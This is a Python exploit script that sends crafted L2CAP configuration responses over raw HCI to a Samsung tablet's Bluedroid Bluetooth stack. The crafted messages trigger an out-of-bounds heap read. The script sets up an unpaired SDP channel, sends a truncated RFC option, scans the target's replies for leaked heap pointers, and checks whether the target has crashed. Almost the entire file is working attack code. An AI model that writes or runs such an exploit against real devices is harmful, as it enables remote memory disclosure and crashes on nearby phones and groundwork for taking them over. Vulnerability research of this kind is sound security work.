#!/usr/bin/env python3
"""
OOB Heap Read Probe via L2CAP CONF_RSP Option Parsing
Target: SM-T377A bluetooth.default.so (Bluedroid Android 6.0.1)

The CONF_RSP option parser in l2c_rcv_acl_data uses hardcoded option sizes
but only bounds-checks the option TYPE byte position. If a QOS/RFC/EFS
option's type byte is near the packet end, the data bytes read from the
adjacent heap.

This probe sends CONF_RSP packets with the boundary option at different
positions to trigger the OOB read, then captures any reflected data in
the target's subsequent CONF_REQ (renegotiation after UNACCEPT).

Requires: pybluez, paired with target, bluetoothd running
Usage: sudo python3 oob_probe.py 02:00:00:00:00:21
"""
import bluetooth
import struct
import sys
import time
import socket as _socket

TARGET = sys.argv[1] if len(sys.argv) > 1 else '02:00:00:00:00:21'

# We'll use scapy for raw HCI to capture the target's response precisely
# But first, let's use pybluez L2CAP for the basic approach

print(f'=== OOB Heap Read Probe | {TARGET} ===')
print()

def build_conf_rsp_oob(ident, scid, boundary_type, options_before_boundary):
    """Build a CONF_RSP where the last option triggers OOB read.
    
    boundary_type: which option to use at the boundary
      1 = MTU (reads 4 bytes total, 2 OOB) — small leak
      3 = QOS (reads 24 bytes total, 22+ OOB) — big leak
      4 = RFC (reads 11 bytes total, 9+ OOB) — medium leak
      6 = EFS (reads 18 bytes total, 16+ OOB) — large leak
    
    options_before_boundary: number of MTU filler options before the boundary
    """
    # CONF_RSP header: scid(2) + flags(2) + result(2) = 6 bytes
    # Result = UNACCEPT (0x0001) so target renegotiates
    payload = struct.pack('<HHH', scid, 0x0000, 0x0001)
    
    # Filler options (MTU = 4 bytes each: type + len + value)
    for i in range(options_before_boundary):
        payload += bytes([0x01, 0x02, 0x00, 0x02])  # MTU=512
    
    # Boundary option: just the type byte (and maybe length byte)
    # The parser will try to read the full option data from heap
    payload += bytes([boundary_type])
    # Optionally add the length byte too (1 more byte in bounds)
    # payload += bytes([0x00])  # length byte (parser ignores it for hardcoded types)
    
    # Build L2CAP signaling command
    # code(1) + ident(1) + length(2) + payload
    sig = struct.pack('<BBH', 0x05, ident, len(payload)) + payload
    return sig

# We need raw L2CAP signaling access. pybluez L2CAP sockets handle signaling
# internally, so we need to go lower. Let's use the Scapy approach with
# bluetoothd running (for auth), but we need to inject raw signaling.
#
# Alternative: Use pybluez to connect to SDP (PSM 1), which triggers normal
# L2CAP config. Then during the config exchange, we send our crafted CONF_RSP
# instead of the normal one.
#
# Actually, the simplest approach: connect pybluez to SDP PSM,
# then use a SECOND raw socket to inject signaling on CID 1.

# Approach: Open SDP connection (triggers L2CAP config), then we intercept
# and send our own CONF_RSP via scapy BluetoothUserSocket.
# But BluetoothUserSocket conflicts with bluetoothd...

# Simpler: We already confirmed that the Scapy exploit (bluborne_scapy_exploit.py)
# can do full L2CAP signaling via BluetoothUserSocket. The pairing keys were
# the problem before. But now, if we use BluetoothUserSocket, we lose bluetoothd
# and thus lose pairing keys.
#
# KEY INSIGHT: For L2CAP signaling on PSM 1 (SDP), pairing is NOT required!
# Our previous testing showed SDP works fine without pairing.
# The SEC_BLOCK was only for BNEP (PSM 15).
#
# So we can use BluetoothUserSocket for the OOB probe on SDP channel
# WITHOUT needing pairing!

print('[*] Using Scapy BluetoothUserSocket for raw L2CAP signaling...')
print('[*] (No pairing needed for L2CAP signaling on PSM 1)')
print()

import subprocess
subprocess.run(['systemctl', 'stop', 'bluetooth'], capture_output=True)
subprocess.run(['hciconfig', 'hci0', 'down'], capture_output=True)
time.sleep(0.5)

from scapy.layers.bluetooth import *
from scapy.packet import Raw

bt = BluetoothUserSocket(0)

# HCI Reset
bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x03, ocf=0x0003))
time.sleep(1)
for _ in range(10):
    bt.ins.settimeout(0.3)
    try: bt.recv()
    except: pass

# Enable scan
bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x03, ocf=0x001a, len=1) / Raw(b'\x03'))
time.sleep(0.3)
for _ in range(5):
    try: bt.recv()
    except: pass

# ACL connect
print(f'[*] ACL connecting to {TARGET}...')
addr = bytes.fromhex(TARGET.replace(':', ''))[::-1]
params = addr + struct.pack('<HBBHB', 0xCC18, 0x02, 0x00, 0x0000, 0x01)
bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x01, ocf=0x0005, len=len(params)) / Raw(params))

handle = None
for _ in range(60):
    bt.ins.settimeout(1)
    try: p = bt.recv()
    except: continue
    if p and HCI_Event_Hdr in p and p[HCI_Event_Hdr].code == 0x03:
        raw_d = bytes(p[HCI_Event_Hdr].payload)
        if len(raw_d) >= 3 and raw_d[0] == 0:
            handle = struct.unpack('<H', raw_d[1:3])[0]
            print(f'[+] ACL connected, handle=0x{handle:04x}')
            break

if not handle:
    print('[-] ACL failed'); sys.exit(1)
time.sleep(0.3)

CID_SIG = 1

def send_sig(data):
    pkt = HCI_Hdr(type=2) / HCI_ACL_Hdr(handle=handle, PB=0, BC=0) / L2CAP_Hdr(cid=CID_SIG) / Raw(data)
    bt.send(pkt)

def recv_sig(timeout=2):
    """Receive and extract L2CAP signaling data."""
    bt.ins.settimeout(timeout)
    try:
        p = bt.recv()
    except:
        return None
    if p is None:
        return None
    raw = bytes(p)
    # Scan for L2CAP signaling
    for i in range(len(raw) - 8):
        try:
            ll, lc = struct.unpack('<HH', raw[i:i+4])
            if lc == CID_SIG and 4 <= ll <= 500 and i + 4 + ll <= len(raw):
                return raw[i+4:i+4+ll]
        except:
            continue
    return None

def l2cmd(code, ident, data):
    return struct.pack('<BBH', code, ident, len(data)) + data

# Step 1: Establish L2CAP channel via normal signaling
print('[*] L2CAP signaling exchange...')

# Send CONN_REQ for SDP
send_sig(l2cmd(0x02, 1, struct.pack('<HH', 0x0001, 0x0040)))

target_dcid = None
nid = 2

for _ in range(40):
    sig = recv_sig(1)
    if sig is None:
        continue
    if len(sig) < 4:
        continue
    code, ident = sig[0], sig[1]
    slen = struct.unpack('<H', sig[2:4])[0]
    sd = sig[4:4+slen]

    if code == 0x0a:  # INFO_REQ
        it = struct.unpack('<H', sd[:2])[0]
        if it == 2:
            send_sig(l2cmd(0x0b, ident, struct.pack('<HHI', 2, 0, 0xB8)))
        elif it == 3:
            send_sig(l2cmd(0x0b, ident, struct.pack('<HH', 3, 0) + b'\x02' + b'\x00' * 7))
        else:
            send_sig(l2cmd(0x0b, ident, struct.pack('<HH', it, 1)))
        # Re-send CONN_REQ after info exchange
        if not target_dcid:
            send_sig(l2cmd(0x02, nid, struct.pack('<HH', 0x0001, 0x0040)))
            nid += 1

    elif code == 0x03:  # CONN_RSP
        dc, sc, res, st = struct.unpack('<HHHH', sd[:8])
        print(f'  CONN_RSP dcid=0x{dc:04x} result={res}')
        if res == 0:
            target_dcid = dc

    elif code == 0x04:  # CONF_REQ from target
        rd = struct.unpack('<H', sd[:2])[0]
        print(f'  CONF_REQ dcid=0x{rd:04x} opts={sd[4:].hex() if len(sd) > 4 else "none"}')
        conf_req_ident = ident
        conf_req_opts = sd[4:] if len(sd) > 4 else b''
        # Send our CONF_REQ first so target responds
        send_sig(l2cmd(0x04, nid, struct.pack('<HH', target_dcid, 0) + bytes([0x01, 0x02, 0x00, 0x02])))
        nid += 1
        print(f'  [->] Our CONF_REQ sent')
        break

    elif code == 0x05:  # CONF_RSP
        print(f'  CONF_RSP (unexpected)')

if not target_dcid:
    print('[-] No channel established')
    bt.close(); sys.exit(1)

print(f'[+] Channel established: our SCID=0x0040, target DCID=0x{target_dcid:04x}')
print()

# Step 2: Capture target's CONF_RSP to our CONF_REQ
# AND send OOB CONF_RSP as our response to target's CONF_REQ
# The channel is still in CONFIG state — both sides need to exchange configs

# Wait for target's CONF_RSP (response to our CONF_REQ)
target_conf_rsp = None
for _ in range(10):
    sig = recv_sig(1)
    if sig and len(sig) >= 4 and sig[0] == 0x05:
        rr = struct.unpack('<H', sig[8:10])[0] if len(sig) >= 10 else -1
        print(f'[<-] Target CONF_RSP result={rr} data={sig.hex()}')
        target_conf_rsp = sig
        break

# NOW send the OOB probe as our CONF_RSP to the target's CONF_REQ
# The target is still waiting for our CONF_RSP (we received its CONF_REQ
# but haven't replied yet). Channel is in CONFIG state on the target side.
print()
print('=' * 50)
print(' SENDING OOB HEAP READ PROBE')
print(' (as CONF_RSP to target CONF_REQ, CONFIG state)')
print('=' * 50)
print()

# Send the OOB probe using the target's CONF_REQ ident
# Use RFC type (4) — reads 11 bytes, compact and reliable
oob_payload = build_conf_rsp_oob(conf_req_ident, target_dcid, 4, 0)
print(f'[->] OOB CONF_RSP(UNACCEPT) with truncated RFC option')
print(f'     ident={conf_req_ident}, scid=0x{target_dcid:04x}, {len(oob_payload)} bytes')
print(f'     payload: {oob_payload.hex()}')
send_sig(oob_payload)

# Capture ALL responses for 5 seconds
print()
print('[*] Listening for responses (leaked data may appear in new CONF_REQ)...')
responses = []
start = time.time()
while time.time() - start < 5:
    sig = recv_sig(0.5)
    if sig and len(sig) >= 4:
        code = sig[0]
        slen = struct.unpack('<H', sig[2:4])[0]
        sd = sig[4:4+slen]
        print(f'  [<-] code=0x{code:02x} ident={sig[1]} len={len(sig)}')
        print(f'       data: {sig.hex()}')
        responses.append(sig)
        
        # If it's a CONF_REQ, the options may contain leaked heap data!
        if code == 0x04 and len(sd) >= 4:
            print(f'       *** GOT CONF_REQ — options may contain leaked heap data! ***')
            print(f'       options: {sd[4:].hex() if len(sd) > 4 else "none"}')
            # Parse options to extract potential pointers
            opts = sd[4:]
            pos = 0
            while pos + 2 <= len(opts):
                otype = opts[pos] & 0x7f
                olen = opts[pos+1]
                odata = opts[pos+2:pos+2+olen]
                print(f'       opt type={otype} len={olen} data={odata.hex()}')
                # Check for values that look like heap pointers (0xb6xxxxxx range for libs)
                for j in range(0, len(odata) - 3, 2):
                    val = struct.unpack('<I', odata[j:j+4])[0] if j + 4 <= len(odata) else 0
                    if 0xb6000000 <= val <= 0xb7000000:
                        print(f'       *** POSSIBLE HEAP POINTER: 0x{val:08x} ***')
                    elif 0xa0000000 <= val <= 0xc0000000:
                        print(f'       *** POSSIBLE POINTER: 0x{val:08x} ***')
                pos += 2 + olen

if not responses:
    # Check if still alive
    try:
        send_sig(l2cmd(0x08, 0x42, b'PING'))
        pong = recv_sig(2)
        if pong:
            print('[*] Target still alive but sent no response to OOB probe')
        else:
            print('[!] *** TARGET NOT RESPONDING — OOB READ CAUSED CRASH! ***')
    except:
        print('[!] *** CONNECTION LOST — OOB CRASH CONFIRMED! ***')

# Final status
print('[*] Probe complete. Disconnecting...')
try:
    bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x01, ocf=0x0006, len=3) / Raw(struct.pack('<HB', handle, 0x13)))
except: pass
time.sleep(0.3)
bt.close()
print('[*] Done.')
